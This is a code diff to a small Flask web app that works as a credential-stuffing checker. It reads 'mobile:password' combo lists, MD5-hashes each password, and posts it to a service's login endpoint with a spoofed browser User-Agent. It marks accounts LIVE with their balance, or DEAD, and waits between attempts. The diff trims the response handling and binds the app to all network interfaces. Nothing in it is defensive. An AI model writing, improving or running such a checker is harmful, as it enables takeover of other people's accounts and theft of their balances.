@@ -2,8 +2,6 @@ from flask import Flask, render_template, request, jsonify
 import requests
 import hashlib
 import time
-import csv
-from datetime import datetime
 
 app = Flask(__name__)
 
@@ -27,7 +25,6 @@ def check():
     for line in combos:
         if not line or ':' not in line:
             continue
-            
         mobile, password = [x.strip() for x in line.split(':', 1)]
         
         mobile = mobile.replace(" ", "").replace("-", "")
@@ -36,36 +33,24 @@ def check():
 
         hashed = md5(password)
 
-        headers = {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-        }
+        headers = {"User-Agent": "Mozilla/5.0"}
 
         params = {"mobile": mobile, "password": hashed}
 
         try:
             r = requests.post(BASE + "login", params=params, headers=headers, timeout=12)
-            
-            if r.status_code == 200:
-                res = r.json()
-                if res.get("res") == 1:
-                    balance = res.get("obj", {}).get("balance", 0)
-                    results.append([mobile, "LIVE", balance, ""])
-                    live += 1
-                else:
-                    results.append([mobile, "DEAD", "", res.get("resMsg", "Failed")])
+            if r.status_code == 200 and r.json().get("res") == 1:
+                balance = r.json().get("obj", {}).get("balance", 0)
+                results.append([mobile, "LIVE", balance])
+                live += 1
             else:
-                results.append([mobile, "DEAD", "", f"HTTP {r.status_code}"])
+                results.append([mobile, "DEAD", ""])
         except:
-            results.append([mobile, "ERROR", "", ""])
+            results.append([mobile, "ERROR", ""])
 
         time.sleep(2)
 
-    return jsonify({
-        "status": "done",
-        "live": live,
-        "total": len(results),
-        "results": results
-    })
+    return jsonify({"live": live, "results": results})
 
-if __name__ == '__main__':
-    app.run(debug=False)
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=5000)
